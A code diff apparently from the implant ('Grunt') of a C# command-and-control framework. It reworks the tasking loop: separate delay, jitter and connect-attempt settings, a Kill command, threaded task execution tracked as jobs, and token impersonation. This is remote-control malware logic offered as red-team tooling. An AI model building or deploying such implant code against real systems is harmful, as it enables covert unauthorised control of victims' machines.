@@ -94,26 +94,29 @@ namespace GruntExecutor
                     try
                     {
                         GruntTaskingMessage message = messenger.ReadTaskingMessage();
-                        if (message != null)
+                        if (message == null)
+                        {
+                            ConnectAttemptCount++;
+                        }
+                        else
                         {
                             ConnectAttemptCount = 0;
                             string output = "";
-                            if (message.Type == GruntTaskingType.SetOption)
+                            if (message.Type == GruntTaskingType.SetDelay || message.Type == GruntTaskingType.SetJitter || message.Type == GruntTaskingType.SetConnectAttempts)
                             {
-								string[] split = message.Message.Split(',');
-                                if (split.Length >= 2 && int.TryParse(split[1], out int val))
+                                if (int.TryParse(message.Message, out int val))
                                 {
-                                    if (split[0].Equals("Delay", StringComparison.CurrentCultureIgnoreCase))
+                                    if (message.Type == GruntTaskingType.SetDelay)
                                     {
                                         Delay = val;
                                         output += "Set Delay: " + Delay;
                                     }
-                                    else if (split[0].Equals("JitterPercent", StringComparison.CurrentCultureIgnoreCase))
+                                    else if (message.Type == GruntTaskingType.SetJitter)
                                     {
                                         Jitter = val;
-                                        output += "Set JitterPercent: " + Jitter;
+                                        output += "Set Jitter: " + Jitter;
                                     }
-                                    else if (split[0].Equals("ConnectAttempts", StringComparison.CurrentCultureIgnoreCase))
+                                    else if (message.Type == GruntTaskingType.SetConnectAttempts)
                                     {
                                         ConnectAttempts = val;
                                         output += "Set ConnectAttempts: " + ConnectAttempts;
@@ -121,13 +124,13 @@ namespace GruntExecutor
                                 }
                                 else
                                 {
-                                    output += "Error parsing SetOption: " + message.Message;
+                                    output += "Error parsing: " + message.Message.Split(',')[1];
                                 }
                                 messenger.WriteTaskingMessage(output, message.Name);
                             }
-                            else if (message.Type == GruntTaskingType.Exit)
+                            else if (message.Type == GruntTaskingType.Kill)
                             {
-                                output += "Exited";
+                                output += "Killed";
                                 messenger.WriteTaskingMessage(output, message.Name);
                                 return;
                             }
@@ -149,8 +152,11 @@ namespace GruntExecutor
                                     impersonationContext.Undo();
                                 }
                                 IntPtr impersonatedToken = IntPtr.Zero;
-                                impersonatedToken = TaskExecute(messenger, message);
-                                if (impersonatedToken != IntPtr.Zero)
+                                Thread t = new Thread(() => impersonatedToken = TaskExecute(messenger, message));
+                                t.Start();
+                                Jobs.Add(new KeyValuePair<string, Thread>(message.Name, t));
+                                bool completed = t.Join(5000);
+                                if (completed && impersonatedToken != IntPtr.Zero)
                                 {
                                     try
                                     {
@@ -703,8 +709,10 @@ namespace GruntExecutor
     public enum GruntTaskingType
     {
         Assembly,
-        SetOption,
-        Exit,
+        SetDelay,
+        SetJitter,
+        SetConnectAttempts,
+        Kill,
         Connect,
         Disconnect,
         Jobs
